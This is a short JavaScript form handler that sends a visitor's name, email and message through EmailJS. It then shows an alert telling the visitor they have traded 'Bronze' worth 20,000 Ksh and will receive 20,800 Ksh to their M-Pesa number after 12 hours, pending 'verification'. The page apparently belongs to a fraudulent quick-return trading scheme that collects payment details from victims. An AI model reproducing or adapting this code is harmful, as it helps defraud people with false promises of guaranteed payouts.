function sendMail() {
    var params = {
      name: document.getElementById("name").value,
      email: document.getElementById("email").value,
      message: document.getElementById("message").value,
    };
     const serviceID = "service_yqhhkjc";
    const templateID = "template_ijdfnyd";
  
      emailjs.send(serviceID, templateID, params)
      .then(res=>{
          document.getElementById("name").value = "";
          document.getElementById("email").value = "";
          document.getElementById("message").value = "";
          console.log(res);
          alert(" Success; You have  Traded Bronze  Worth 20,000 Ksh ,Your Payout is 20,800.00 Ksh 💸 after 12 Hours .  You will get paid to Your M-pesa Number  when your M-pesa Message Completes Verification ⚠")
  
      })
      .catch(err=>console.log(err));
  
  }